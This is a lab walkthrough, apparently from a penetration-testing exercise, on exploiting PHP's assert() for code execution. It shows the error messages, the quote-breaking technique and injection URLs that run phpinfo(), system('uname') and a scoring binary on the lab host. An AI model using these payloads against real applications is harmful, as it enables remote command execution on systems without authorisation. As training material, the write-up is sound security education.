Code Execution 04

This example is based on the function assert. When used incorrectly, this function will evaluate the value received. This behaviour can be used to gain code execution.

By injecting a single quote or double quote (depending on the way the string was declared), we can see an error message indicating that PHP tried to evaluate the code:
* Parse error: syntax error, unexpected T_ENCAPSED_AND_WHITESPACE in /var/www/codeexec/example4.php(4) : assert code on line 1 Catchable fatal error: assert(): Failure evaluating code: 'hacker'' in /var/www/codeexec/example4.php on line 4

Once we broke the syntax, we need to try to reconstruct it correctly. We can try the following: hacker'.'. The error message disappeared.

Now that we know how to finish the syntax to avoid errors, we can just inject our payload to run the function phpinfo(): hacker'.phpinfo().' and we get the configuration of the PHP engine in the page.

Finally, we can use system to score.

To finish this exercise, you need to run the binary (/usr/local/bin/score) with your UUID (dd19b1aa-7a48-4881-87ce-4fd3f96516f8) as first argument:

/usr/local/bin/score dd19b1aa-7a48-4881-87ce-4fd3f96516f8

You can access this exercise using the following URL: http://ptc-ee8d5d12-d4791085.libcurl.so/. 
You can also use the TLS version if you're experiencing timeouts due to network filtering: https://ptl-ee8d5d12-d4791085.libcurl.so/.


Common Mistakes:

  *  Make sure you replace the full netcat command with the score command followed by your UUID: /usr/local/bin/score ....

  Steps: 
    1) Visit the given url: http://ptc-ee8d5d12-d4791085.libcurl.so/
    2) Observe the parameter we find something added. We can inject with a single quote in the parameter to see syntax error.
       It seems as: https://ptl-ee8d5d12-d4791085.libcurl.so/?name=hacker'27. And it works.
    3) we've probably injecting in an assert and in PHP that can lead to code execution.
    5) Try to run phpinfo as usual: https://ptl-ee8d5d12-d4791085.libcurl.so/?name=hacker'.phpinfo.'
        Wah, I works.
    4) Let's try to close the injection properly. 
        It seems as:  https://ptl-ee8d5d12-d4791085.libcurl.so/?name=hacker'.'Anoint'.'
        Look it reflect as:  Hello hacker'.'Anoint'.'
    5) Now, we can run system in this parameter replacing 'Anoint' to 'uname' 
                It seems as:  https://ptl-ee8d5d12-d4791085.libcurl.so/?name=hacker'.system('uname').'
            It works as shown linux as a uname.
    6) Let's replace the command by (/usr/local/bin/score) with our UUID (dd19b1aa-7a48-4881-87ce-4fd3f96516f8). 
        It seems as: https://ptl-ee8d5d12-d4791085.libcurl.so/?name=hacker'.system('/usr/local/bin/score dd19b1aa-7a48-4881-87ce-4fd3f96516f8').'
    7) Bravo!! Exercise completed!! Hello hacker'.system('/usr/local/bin/score dd19b1aa-7a48-4881-87ce-4fd3f96516f8').'

    Happy Hacking!! :) 